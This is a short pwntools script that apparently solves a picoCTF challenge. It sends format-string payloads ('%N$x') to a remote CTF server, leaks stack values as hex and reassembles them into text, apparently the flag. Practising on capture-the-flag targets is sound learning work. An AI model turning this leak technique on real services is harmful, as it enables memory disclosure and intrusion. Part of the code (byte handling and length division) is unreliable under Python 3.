from pwn import *

tot = ""
for i in range(30):
  p = remote("mercury.picoctf.net", 20195)
  p.sendlineafter("do?", "1")
  p.sendlineafter("token?", "%" + str(i + 1) + "$x")

  p.recvuntil("token:")
  p.recvline()
  
  leak = p.recvline(keepends=False)
  blk = ""
  for j in range(len(leak) / 2):
    curr = int(leak[2*j:2*j+2], 16)
    print(chr(curr))

    blk = chr(curr) + blk
  tot += blk
print(tot)
